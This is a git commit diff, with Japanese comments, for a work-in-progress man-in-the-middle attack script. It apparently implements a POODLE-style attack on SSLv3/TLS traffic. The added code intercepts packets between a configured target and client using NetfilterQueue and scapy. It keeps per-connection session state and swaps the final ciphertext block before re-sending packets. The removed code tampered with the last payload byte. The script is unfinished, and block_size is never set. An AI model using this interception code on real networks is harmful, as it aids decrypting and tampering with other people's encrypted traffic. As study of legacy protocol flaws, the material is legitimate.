c2e2a72f7e6664b9d1de66c8f37d91354f172686
GoRuGoo <goru.technology@gmail.com>
2025-01-14 03:41:15 +0900

    wip: sessionを使った実装まで

--- mitm/attack/attack.py
+++ mitm/attack/attack.py
@@ -1,56 +1,52 @@
-#from netfilterqueue import NetfilterQueue
-#from scapy.all import IP, TCP
-#from scapy.all import *
-#from utils.is_sslv3_packet import is_sslv3_packet
-#from utils.set_modified_payload_to_packet import set_modified_payload_to_packet
-#
-#
-#def attack_callback(packet):
-#    pkt = IP(packet.get_payload())
-#
-#    packet.accept()
-#
-#try:
-#    nfqueue = NetfilterQueue()
-#    nfqueue.bind(0, attack_callback)
-#    nfqueue.run()
-#except KeyboardInterrupt:
-#    pass
-#
-#nfqueue.unbind()
-#
-
 from netfilterqueue import NetfilterQueue
-from scapy.all import IP, TCP
+import scapy.all as scapy
 from scapy.all import *
+from scapy.layers.tls.all import TLS, TLSClientHello, TLSServerHello
+from scapy.layers.http import *
+from scapy.layers.tls import *
+from scapy.all import IP, TCP
 from utils.is_sslv3_packet import is_sslv3_packet
-from utils.set_modified_payload_to_packet import set_modified_payload_to_packet
 from utils.extract_ssl_message_type import extract_ssl_message_type
-from scapy.layers.inet import IP,TCP
+from utils.modify_and_send_packet import modify_and_send_packet
+from scapy.layers.inet import IP, TCP
 
+config = json.load(open('config.json'))
+
+block_size = None
+
+
+# パケット毎に変わる情報を保持しておく
+class Session:
+    def __init__(self, src_port):
+        self.downgrade_needed = False
+        self.src_port = src_port
+        self.ciphertext = None
+        self.last_seq = None
+        self.block = None
+
+
+sessions = {}
 
 
 def attack_callback(packet):
+    global sessions
+    global block_size
+
     pkt = IP(packet.get_payload())
 
-    # SSLv3パケットかつ、送信元がclientの場合
-    if is_sslv3_packet(pkt) and pkt.src == "192.168.0.10":
+    if pkt.src == config['target'] and pkt.dst == config['client'] and pkt.haslayer(TLS):
+        src_port = pkt['TCP'].sport
 
-        payload = pkt[TCP].payload
+        # src_portをキーに持つ形でリクエストごとの暗号文などの情報を保持しておく
+        session = sessions[src_port] if src_port in sessions else Session(
+            src_port)
 
-        if len(payload) > 0:
-            modified_payload = bytes(payload)[:-1] + b'\x01' # 下位1バイトを変更
-            #modified_payload = bytes(payload)[:-1] + bytes(payload)[-1:] # 下位1バイトを変更
-            #modified_payload = payload.copy()
+        if session.ciphertext is not None and bytes(pkt)[-block_size:] == session.ciphertext[-block_size:]:
+            new_bytes = bytes(pkt)[:-block_size] + session.block
+            modify_and_send_packet(packet, IP(new_bytes))
 
+        sessions[src_port] = session
 
-            modified_pkt = pkt.copy()
-            modified_pkt[TCP].payload = Raw(modified_payload)
-
-            set_modified_payload_to_packet(packet, modified_pkt)
-            message_type = extract_ssl_message_type(modified_payload)
-            print(message_type)
-            hexdump(packet.get_payload())
     packet.accept()
 
 
